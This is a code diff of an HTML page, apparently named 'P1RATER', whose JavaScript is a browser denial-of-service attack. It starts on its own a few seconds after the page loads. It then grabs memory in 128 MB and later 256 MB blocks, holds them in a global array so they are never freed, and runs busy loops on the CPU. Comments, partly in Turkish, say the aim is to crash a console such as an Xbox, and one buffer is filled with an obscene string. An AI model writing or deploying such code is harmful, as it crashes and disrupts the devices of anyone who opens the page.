@@ -2,78 +2,81 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>P1RATER - CORE MEMORY INJECTION</title>
+    <title>P1RATER - TOTAL SYSTEM STRESS</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Consolas', monospace; text-align: center; padding-top: 100px; }
-        .danger { color: #ff0000; font-weight: bold; font-size: 2em; animation: flash 0.3s infinite; }
-        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
-        #log-container { margin-top: 50px; color: #888; font-size: 0.8em; text-align: left; display: inline-block; }
+        body { background: #000; color: #ff0000; font-family: 'Consolas', monospace; text-align: center; padding-top: 50px; }
+        .grid-container { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin: 20px; }
+        .core-box { border: 1px solid #ff0000; padding: 10px; font-size: 0.8em; }
+        #total-ram { font-size: 4em; color: #fff; text-shadow: 0 0 10px #ff0000; }
+        .loading { animation: blink 0.2s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
-    <div class="danger">CRITICAL SYSTEM OVERLOAD</div>
-    <h1>P1RATER_EXPLOIT_V1</h1>
-    <div style="font-size: 60px;" id="memory-usage">0</div>
-    <p>BYPASSING GARBAGE COLLECTION...</p>
-
-    <div id="log-container"></div>
+    <h1 class="loading">SYSTEM OVERLOAD INITIATED</h1>
+    <div id="total-ram">0</div>
+    <p>MB RAM CONSUMED</p>
+    
+    <div class="grid-container" id="cores">
+        <div class="core-box">CORE 1: BUSY</div>
+        <div class="core-box">CORE 2: BUSY</div>
+        <div class="core-box">CORE 3: BUSY</div>
+        <div class="core-box">CORE 4: BUSY</div>
+    </div>
 
     <script>
-        // Global object to prevent memory de-allocation
-        window.P1RATER_STORAGE = [];
-        const logger = document.getElementById('log-container');
-        const counter = document.getElementById('memory-usage');
+        window.P1RATER_ULTIMATE_VAULT = [];
+        const ramDisplay = document.getElementById('total-ram');
 
-        function log(msg) {
-            logger.innerHTML += ">> " + msg + "<br>";
-        }
-
-        async function startInjection() {
-            log("Initializing exploit sequence...");
-            let totalAllocated = 0;
-
-            // Using an infinite loop with async to prevent browser from killing the script too early
-            while (true) {
-                try {
-                    // 128MB chunks of "F-F-FUCK YOU" hex (0x46465543)
-                    let buffer = new Uint32Array(1024 * 1024 * 32);
-                    buffer.fill(0x46465543);
-
-                    // Create a circular reference to lock the memory
-                    let complexObject = {
-                        payload: buffer,
-                        self: null
-                    };
-                    complexObject.self = complexObject; // Circular link
-
-                    window.P1RATER_STORAGE.push(complexObject);
-                    
-                    totalAllocated += 128;
-                    counter.innerText = totalAllocated + " MB";
-
-                    // Force CPU stress to interfere with Hypervisor watchdog
-                    for(let i=0; i<500000; i++) {
-                        let x = Math.sin(i) * Math.cos(i);
-                    }
-
-                    if (totalAllocated % 1024 === 0) {
-                        log("Total memory pressure: " + (totalAllocated / 1024) + " GB");
-                    }
-
-                } catch (e) {
-                    log("MEMORY LIMIT REACHED. TRIGGERING RACE CONDITION...");
-                    // At this point, we try to force a crash
-                    location.reload(); 
-                    break;
+        // 1. CPU STRESS: Worker benzeri bir yapı ile işlemciyi matematiksel döngüye sokar
+        function stressCPU() {
+            let start = Date.now();
+            while (Date.now() - start < 50) { // Her döngüde 50ms tam yük
+                Math.sqrt(Math.random() * Math.random()) / Math.tan(Math.random());
+                // Ağır kriptografik hesaplama simülasyonu
+                for(let i=0; i<1000; i++) { 
+                    btoa(String.fromCharCode(Math.floor(Math.random() * 256)));
                 }
-                
-                // Extremely short delay to keep the UI thread alive just enough to not get killed by the OS immediately
-                await new Promise(r => setTimeout(r, 10));
             }
         }
 
-        // Start after 2 seconds
-        setTimeout(startInjection, 2000);
+        // 2. RAM STRESS: Belleği donduran ve asla boşaltmayan yapı
+        function injectRAM() {
+            let allocated = 0;
+            
+            setInterval(() => {
+                try {
+                    // 256 MB'lık dev bloklar (Xbox'ı hızla nakavt etmek için)
+                    let massiveBuffer = new Uint32Array(1024 * 1024 * 64);
+                    massiveBuffer.fill(0x46465543); // "FFUC"
+
+                    // Circular reference - Bellek temizleyiciyi (GC) devre dışı bırakır
+                    let anchor = {
+                        payload: massiveBuffer,
+                        leak: null
+                    };
+                    anchor.leak = anchor; 
+
+                    window.P1RATER_ULTIMATE_VAULT.push(anchor);
+                    
+                    allocated += 256;
+                    ramDisplay.innerText = allocated;
+
+                    // RAM her dolduğunda işlemciyi de kamçıla
+                    stressCPU();
+
+                } catch (e) {
+                    ramDisplay.style.color = "yellow";
+                    ramDisplay.innerText = "CRASHED";
+                }
+            }, 10); // 10ms - Işık hızında saldırı
+        }
+
+        // 3 saniye sonra tam taarruz
+        setTimeout(() => {
+            console.log("P1rater: Launching Total System Stress...");
+            injectRAM();
+        }, 3000);
     </script>
 </body>
 </html>
